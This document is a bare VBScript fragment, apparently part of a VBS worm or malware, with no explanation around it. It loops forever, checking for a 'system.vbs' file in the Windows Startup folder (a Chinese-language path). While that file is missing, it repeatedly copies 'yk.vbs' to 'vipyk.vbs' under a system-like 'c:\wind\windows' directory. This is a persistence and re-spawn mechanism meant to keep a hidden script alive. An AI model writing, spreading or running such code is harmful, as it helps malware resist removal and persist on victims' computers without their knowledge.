Set fso = CreateObject("Scripting.FileSystemObject") 

do 
if fso.fileexists("C:\Documents and Settings\All Users\「开始」菜单\程序\启动\system.vbs") then 
wscript.sleep 1000 
else 
fso.copyfile "c:\wind\windows\yk.vbs","C:\wind\windows\vipyk.vbs" 
 end if
loop